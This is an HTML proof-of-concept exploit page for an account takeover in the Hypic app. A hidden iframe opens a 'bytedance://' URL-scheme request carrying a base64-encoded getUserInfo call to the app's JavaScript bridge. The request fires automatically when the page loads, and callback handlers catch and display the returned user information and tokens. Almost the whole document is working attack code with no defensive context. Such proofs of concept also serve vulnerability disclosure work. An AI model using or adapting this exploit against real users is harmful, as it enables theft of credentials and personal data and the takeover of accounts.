<!DOCTYPE html>
<html>
<head>
    <title>Hypic JSB ATO PoC</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: sans-serif; padding: 20px; }
        #output { background: #f4f4f4; padding: 10px; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word; }
        button { padding: 15px 20px; font-size: 16px; background: #ff3b30; color: white; border: none; border-radius: 5px; cursor: pointer;}
    </style>
</head>
<body>
    <h1>Hypic Account Takeover</h1>
    <p>Attempting to exploit JS Bridge via URL Schema interception...</p>
    <button onclick="stealInfo()">Extract User Tokens</button>
    
    <h3>Extracted Data:</h3>
    <pre id="output">Waiting...</pre>

    <script>
        function log(msg) {
            document.getElementById('output').innerText += msg + "\n";
        }

        // The app can reply to one of these three callbacks, so we register all of them
        window.JSBridge = { 
            _handleMessageFromApp: function(msg) { 
                log("[JSBridge] Received:\n" + JSON.stringify(msg, null, 2)); 
            } 
        };
        
        window.Native2JSBridge = { 
            _handleMessageFromApp: function(msg) { 
                log("[Native2JSBridge] Received:\n" + JSON.stringify(msg, null, 2)); 
            } 
        };
        
        window.ToutiaoJSBridge = { 
            _handleMessageFromToutiao: function(msg) { 
                log("[ToutiaoJSBridge] Received:\n" + JSON.stringify(msg, null, 2)); 
            } 
        };

        // We also define a global callback just in case
        window._handleMessageFromApp = function(msg) {
             log("[Global] Received:\n" + JSON.stringify(msg, null, 2)); 
        };

        function stealInfo() {
            log("Constructing JSB Request...");
            
            // The JSON array the app expects to parse
            var payload = [{
                "__msg_type": "call",
                "func": "getUserInfo",
                "params": {},
                "JSSDK": "1",
                "__callback_id": "pwn_1337"
            }];

            // Convert to JSON string and base64 encode it
            var jsonStr = JSON.stringify(payload);
            var b64Payload = btoa(unescape(encodeURIComponent(jsonStr)));
            
            // Construct the schema URL that WebActivity intercepts
            var schemaUrl = "bytedance://private/setresult/SCENE_FETCHQUEUE&" + b64Payload;
            
            log("Triggering iframe to: " + schemaUrl);

            // Execute via iframe
            var iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = schemaUrl;
            document.body.appendChild(iframe);
            
            setTimeout(function() {
                iframe.remove();
            }, 500);
        }

        // Auto-run on load
        setTimeout(stealInfo, 1000);
    </script>
</body>
</html>
 
